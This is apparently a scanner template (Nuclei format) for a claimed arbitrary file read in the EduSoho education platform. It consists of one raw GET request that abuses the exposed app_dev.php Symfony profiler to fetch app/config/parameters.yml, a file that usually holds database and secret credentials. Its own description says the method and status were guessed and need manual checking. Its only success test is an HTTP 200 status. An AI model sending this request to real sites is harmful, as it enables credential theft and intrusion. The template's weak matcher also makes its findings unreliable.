id: poc-tqyr0u41exwwx7g7
info:
  name: EduSoho 教培系统 app_dev.php 任意读取漏洞
  author: hacktwo
  severity: medium
  description: '[!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: other,2024
http:
- raw:
  - 'GET /app_dev.php/_profiler/open?file=app/config/parameters.yml HTTP/1.1

    Host: {{Hostname}}'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
